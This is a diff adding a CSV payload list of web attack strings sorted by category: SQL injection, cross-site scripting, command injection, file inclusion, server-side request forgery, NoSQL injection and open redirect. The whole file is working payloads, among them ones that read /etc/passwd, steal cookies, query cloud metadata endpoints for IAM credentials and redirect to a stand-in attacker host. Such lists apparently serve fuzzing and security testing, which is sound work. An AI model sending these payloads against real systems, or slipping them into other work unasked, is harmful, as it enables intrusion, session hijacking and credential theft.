@@ -1,0 +1,30 @@
+category,payload
+sqli,' OR '1'='1' --
+sqli," OR "1"="1
+sqli,1' AND SLEEP(3)--
+sqli,1 UNION ALL SELECT NULL,NULL,NULL--
+sqli,WAITFOR DELAY '0:0:3'--
+xss,<img src=x onerror="alert(document.domain)">
+xss,<svg/onload=alert`1`>
+xss,<body onload=alert(1)>
+xss,<details open ontoggle=alert(1)>
+xss,"><img src=x onerror=alert(document.cookie)>
+cmd,; whoami
+cmd,| id
+cmd,&& cat /etc/passwd
+cmd,$(id)
+cmd,; ping -c 1 127.0.0.1
+lfi,../../../../../../../../etc/passwd%00
+lfi,....//....//....//etc/passwd
+lfi,/proc/self/environ
+lfi,php://filter/read=convert.base64-encode/resource=/etc/passwd
+ssrf,http://169.254.169.254/latest/meta-data/iam/security-credentials/
+ssrf,http://metadata.google.internal/computeMetadata/v1/
+ssrf,http://localhost:3306
+ssrf,dict://127.0.0.1:6379/info
+nosql,{"$gt": ""}
+nosql,{"$ne": "invalid"}
+nosql,{"$regex": ".*"}
+open_redirect,//attacker.example.com
+open_redirect,https://attacker.example.com
+open_redirect,///attacker.example.com
